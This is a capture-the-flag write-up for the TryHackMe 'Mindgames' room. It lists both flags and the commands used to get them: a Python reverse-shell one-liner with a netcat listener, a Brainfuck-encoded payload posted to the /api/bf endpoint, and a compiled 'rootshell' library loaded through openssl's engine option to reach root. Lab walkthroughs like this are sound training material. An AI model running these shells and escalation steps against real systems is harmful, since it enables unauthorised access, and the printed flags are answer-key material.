# <div align="center">[Mindgames](https://tryhackme.com/r/room/mindgames)</div>
<div align="center">Just a terrible idea...</div> <br>
<div align="center">
<img src="https://github.com/user-attachments/assets/0d678302-ea56-43cf-af22-0a868e76a63e" height="200"></img>
</div>

## Task 1. Capture the flags
No hints. Hack it. Don't give up if you get stuck, enumerate harder

## User flag.
```
thm{411f7d38247ff441ce4e134b459b6268}
```
* ```nmap -sSCV <IP>```
* ```curl -s http://<IP>```
* ```import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("my_own_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);```
* ```nc -nlvp 4444```
* ```curl -d "+++++ +++++ [REDACTED] ++ ++<]> ++.<" -X POST http://<IP>/api/bf```
* ```cat /home/user.txt```
## ```+ 50``` Root flag.```
```
thm{1974a617cc84c5b51411c283544ee254}
```
* ```cat server.service```
* ```gcc -fPIC -o rootshell.o -c rootshell.c```
* ```gcc -shared -o rootshell.so -lcrypto rootshell.o```
* ```chmod +x rootshell.so```
* ```openssl req -engine ./rootshell.so```
* ```cat /root/root.txt```
